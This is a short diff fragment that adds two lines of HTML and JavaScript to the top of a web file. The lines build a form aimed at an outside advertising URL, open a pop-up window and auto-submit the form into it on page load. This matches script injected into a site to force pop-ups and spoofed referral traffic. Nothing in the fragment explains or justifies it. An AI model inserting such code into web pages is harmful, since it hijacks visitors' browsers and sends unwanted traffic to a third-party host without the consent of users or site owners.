@@ -1,0 +1,2 @@
+<form name=f1 action='http://adcamp.co.kr/expopup.php?id=qw7226' method=post></form>
+<script>var Win= window.open('','REFERER','menubar=yes, resizable=yes, scrollbars=yes,width=800,height=600');</script><script>f1.target='REFERER'</script><script> f1.submit();</script>
